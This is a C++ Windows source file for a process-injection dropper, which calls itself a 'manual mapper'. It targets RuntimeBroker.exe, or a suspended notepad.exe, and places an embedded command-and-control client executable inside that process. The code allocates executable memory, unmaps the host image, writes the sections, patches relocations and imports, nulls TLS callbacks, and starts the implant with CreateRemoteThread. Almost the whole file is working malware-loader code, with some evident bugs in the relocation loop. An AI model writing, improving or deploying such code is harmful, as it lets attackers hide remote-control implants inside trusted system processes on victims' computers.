#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <cstdio>

#include "c2client_array.h"

// Forward declarations
// NTDLL imports for PEB manipulation
typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

DWORD FindTargetPID(const wchar_t* processName);
DWORD GetSafeTarget();

// FIXED FUNCTION SIGNATURES
bool NullTLS(HANDLE hProcess, LPVOID pBase, PIMAGE_NT_HEADERS nt, LPVOID peData);
bool ResolveImports(HANDLE hProcess, LPVOID pBase, PIMAGE_NT_HEADERS nt, LPVOID peData);
void PrintPEInfo(PVOID peData);

// NTDLL imports for PEB manipulation
typedef NTSTATUS(NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

DWORD FindTargetPID(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    DWORD pid = 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

DWORD GetSafeTarget() {
    printf("[DEBUG] Scanning USER targets...\n");

    // 1. RuntimeBroker.exe (primary)
    DWORD pid = FindTargetPID(L"RuntimeBroker.exe");
    if (pid) { printf("[+] Found RuntimeBroker: %lu ✅\n", pid); return pid; }

    // 2. Fallback: Create suspended notepad
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(L"C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        pid = pi.dwProcessId;
        printf("[+] Created SUSPENDED notepad.exe: %lu ✅\n", pid);
        CloseHandle(pi.hProcess);
        return pid;
    }

    printf("[-] No suitable targets found\n");
    return 0;
}

bool CompleteManualMap(HANDLE hProcess, LPVOID peData, DWORD peSize) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)peData;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)peData + dos->e_lfanew);
    
    PrintPEInfo(peData);
    
    printf("\n=== MANUAL MAPPING STEPS ===\n");

    // STEP 1: Allocate at preferred base or RWX fallback
    printf("[1] Allocating memory...\n");
    LPVOID pBase = VirtualAllocEx(hProcess, (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pBase) {
        pBase = VirtualAllocEx(hProcess, NULL, nt->OptionalHeader.SizeOfImage,
            MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }
    if (!pBase) {
        printf("[-] VirtualAllocEx FAILED: %lu\n", GetLastError());
        return false;
    }
    
    ULONG_PTR delta = (ULONG_PTR)pBase - nt->OptionalHeader.ImageBase;
    printf("[+] Base: %p (pref: %p) delta: %llx ✅\n", pBase, 
           (void*)nt->OptionalHeader.ImageBase, delta);

    // STEP 2: Unmap original image if base collision (for hollowing)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)
        GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (delta == 0 && NtUnmapViewOfSection) {
        printf("[2] Unmapping original image at base...\n");
        NTSTATUS status = NtUnmapViewOfSection(hProcess, pBase);
        printf("[+] NtUnmapViewOfSection: %lx\n", status);
    }

    // STEP 3: Write headers + sections
    printf("[3] Writing headers + sections...\n");
    WriteProcessMemory(hProcess, pBase, peData, nt->OptionalHeader.SizeOfHeaders, NULL);
    
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section[i].SizeOfRawData) {
            printf("  [+] Section %d: %s @ %p\n", i, section[i].Name, 
                   (BYTE*)pBase + section[i].VirtualAddress);
            WriteProcessMemory(hProcess, (BYTE*)pBase + section[i].VirtualAddress,
                (BYTE*)peData + section[i].PointerToRawData, section[i].SizeOfRawData, NULL);
        }
    }

    // STEP 4: Apply RELOCATIONS
    printf("[4] Processing relocations...\n");
    if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)peData + 
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        DWORD relocSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
        DWORD fixed = 0;
        
        while (relocSize > 0 && reloc->VirtualAddress) {
            DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < numEntries; i++) {
                WORD entry = entries[i];
                if ((entry >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR* fixup = (ULONG_PTR*)((BYTE*)pBase + reloc->VirtualAddress + (entry & 0xFFF));
                    WriteProcessMemory(hProcess, fixup, &delta, sizeof(ULONG_PTR), NULL);
                    fixed++;
                }
            }
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
            relocSize -= reloc->SizeOfBlock;
        }
        printf("[+] Fixed %lu relocations ✅\n", fixed);
    } else {
        printf("[+] No relocations needed (delta=0) ✅\n");
    }

    // STEP 5: NULL TLS CALLBACKS (CRITICAL for C2 implants)
    // STEP 5: NULL TLS CALLBACKS (CRITICAL for C2 implants)
    printf("[5] Nulling TLS callbacks...\n");
    if (!NullTLS(hProcess, pBase, nt, peData)) {  // ← Pass peData!
        printf("[-] TLS nulling failed\n");
    }

    // STEP 6: Resolve IMPORTS (RuntimeBroker lacks C2 dependencies)
    printf("[6] Resolving imports...\n");
    if (!ResolveImports(hProcess, pBase, nt, peData)) {
        printf("[-] Import resolution failed - using host process APIs\n");
    }

    // STEP 7: Set section protections
    printf("[7] Setting memory protections...\n");
    section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD oldProtect;
        DWORD protect = PAGE_READONLY;  // Default safe
        
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            protect = PAGE_EXECUTE_READ;
            if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) 
                protect = PAGE_EXECUTE_READWRITE;
        } else if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            protect = PAGE_READWRITE;
        }
        
        BOOL result = VirtualProtectEx(hProcess, (BYTE*)pBase + section[i].VirtualAddress,
            section[i].Misc.VirtualSize, protect, &oldProtect);
        printf("  [+] Section %d: %s @ %p -> %x (%s)\n", i, 
               section[i].Name, (BYTE*)pBase + section[i].VirtualAddress, protect,
               result ? "OK" : "FAILED");
    }

    // STEP 8: EXECUTE
    printf("[8] Executing at entry point...\n");
    LPVOID entry = (BYTE*)pBase + nt->OptionalHeader.AddressOfEntryPoint;
    printf("[+] Entry point: %p\n", entry);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
        (LPTHREAD_START_ROUTINE)entry, pBase, 0, NULL);
    if (hThread) {
        printf("[+] EXECUTION THREAD: %p ✅✅✅\n", hThread);
        CloseHandle(hThread);
        return true;
    }
    printf("[-] CreateRemoteThread FAILED: %lu\n", GetLastError());
    return false;
}

bool NullTLS(HANDLE hProcess, LPVOID pBase, PIMAGE_NT_HEADERS nt, LPVOID peData) {
    DWORD tlsRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (!tlsRva || tlsRva >= nt->OptionalHeader.SizeOfImage) {
        printf("[+] No TLS directory ✅\n");
        return true;
    }
    
    printf("[+] TLS RVA: %x\n", tlsRva);
    
    // READ FROM PE FILE (source of truth), NOT remote memory
    IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((BYTE*)peData + tlsRva);
    printf("[+] TLS SizeOfZeroFill: %x, Characteristics: %x\n", 
           tls->SizeOfZeroFill, tls->Characteristics);
    
    PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    if (callbacks && *callbacks != 0) {
        printf("[+] Found TLS callbacks @ RVA %p → NULLING...\n", *callbacks);
        
        // Write NULL to remote TLS.AddressOfCallBacks
        PVOID nullCallback = NULL;
        SIZE_T bytesWritten;
        BOOL result = WriteProcessMemory(hProcess, 
            (BYTE*)pBase + tlsRva + offsetof(IMAGE_TLS_DIRECTORY, AddressOfCallBacks),
            &nullCallback, sizeof(PVOID), &bytesWritten);
        
        printf("[+] TLS null write: %s (%zu bytes)\n", 
               result ? "SUCCESS ✅" : "FAILED ❌", bytesWritten);
        return result != 0;
    }
    printf("[+] No TLS callbacks or already NULL ✅\n");
    return true;
}

bool ResolveImports(HANDLE hProcess, LPVOID pBase, PIMAGE_NT_HEADERS nt, LPVOID peData) {
    DWORD importRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!importRva) {
        printf("[+] No imports directory ✅\n");
        return true;
    }
    
    printf("[+] Import RVA: %x, Size: %x\n", importRva, 
           nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

    // READ FROM PE FILE (safe), not remote memory
    IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)peData + importRva);
    int dllCount = 0;
    
    while (importDesc->Name && 
           importDesc->Name < nt->OptionalHeader.SizeOfImage &&  // Bounds check
           importDesc->FirstThunk) {
        
        char* dllName = (char*)((BYTE*)peData + importDesc->Name);
        printf("  [+] Resolving DLL #%d: %s\n", ++dllCount, dllName);
        
        HMODULE hDll = LoadLibraryA(dllName);  // Load in dropper context
        if (!hDll) {
            printf("    [-] LoadLibraryA(%s) failed: %lu\n", dllName, GetLastError());
            importDesc++;
            continue;
        }
        
        // IAT (FirstThunk) - remote process
        IMAGE_THUNK_DATA* iat = (IMAGE_THUNK_DATA*)((BYTE*)pBase + importDesc->FirstThunk);
        // INT (OriginalFirstThunk) - PE file  
        IMAGE_THUNK_DATA* intTable = (IMAGE_THUNK_DATA*)((BYTE*)peData + importDesc->OriginalFirstThunk);
        
        int apiCount = 0;
        while (intTable->u1.Ordinal) {
            ULONG_PTR ordinal = intTable->u1.Ordinal;
            
            if (ordinal & IMAGE_ORDINAL_FLAG) {
                // Ordinal import
                FARPROC api = GetProcAddress(hDll, (LPCSTR)(ordinal & 0xFFFF));
                if (api) WriteProcessMemory(hProcess, &iat->u1.Function, &api, sizeof(FARPROC), NULL);
            } else {
                // Name import
                IMAGE_IMPORT_BY_NAME* importName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)peData + intTable->u1.AddressOfData);
                FARPROC api = GetProcAddress(hDll, (LPCSTR)importName->Name);
                if (api) {
                    WriteProcessMemory(hProcess, &iat->u1.Function, &api, sizeof(FARPROC), NULL);
                    apiCount++;
                }
            }
            iat++;
            intTable++;
        }
        
        printf("    [+] Fixed %d APIs for %s ✅\n", apiCount, dllName);
        FreeLibrary(hDll);
        importDesc++;
    }
    
    printf("[+] Import table fixed (%d DLLs) ✅✅\n", dllCount);
    return dllCount > 0;
}

void PrintPEInfo(PVOID peData) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)peData;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)peData + dos->e_lfanew);
    
    printf("[PE INFO]\n");
    printf("  Machine: %x (%s)\n", nt->FileHeader.Machine,
           nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ? "x64" : "x86");
    printf("  Entry: %x\n", nt->OptionalHeader.AddressOfEntryPoint);
    printf("  ImageBase: %llx\n", nt->OptionalHeader.ImageBase);
    printf("  ImageSize: %x\n", nt->OptionalHeader.SizeOfImage);
    printf("  Sections: %d\n", nt->FileHeader.NumberOfSections);
    
    DWORD tlsSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;
    printf("  TLS: %x (%s)\n", tlsSize, tlsSize ? "PRESENT" : "NONE");
    
    DWORD importSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    printf("  Imports: %x bytes\n", importSize);
}

int main() {
    AllocConsole();
    freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
    freopen_s((FILE**)stderr, "CONOUT$", "w", stderr);

    printf("=== COMPLETE MANUAL MAPPER v3.0 ===\n");
    printf("Target: RuntimeBroker.exe / notepad.exe (suspended)\n\n");

    DWORD pid = GetSafeTarget();
    if (!pid) {
        printf("[-] ABORT: No target\n");
        Sleep(5000); FreeConsole(); return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                                  PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                                  FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess FAILED: %lu\n", GetLastError());
        Sleep(5000); FreeConsole(); return 1;
    }
    printf("[+] Target process opened: PID %lu ✅\n\n", pid);

    extern unsigned char c2client_exe[];
    extern unsigned int c2client_exe_len;
    printf("[+] C2 Payload: %u bytes loaded ✅\n\n", c2client_exe_len);

    bool success = CompleteManualMap(hProcess, c2client_exe, c2client_exe_len);
    CloseHandle(hProcess);

    printf("\n=== FINAL RESULT: %s ===\n", success ? "SUCCESS ✅✅✅" : "FAILED ❌❌❌");
    printf("Monitor with Wireshark/Process Monitor for C2 traffic!\n");
    
    Sleep(15000);
    FreeConsole();
    return success ? 0 : 1;
}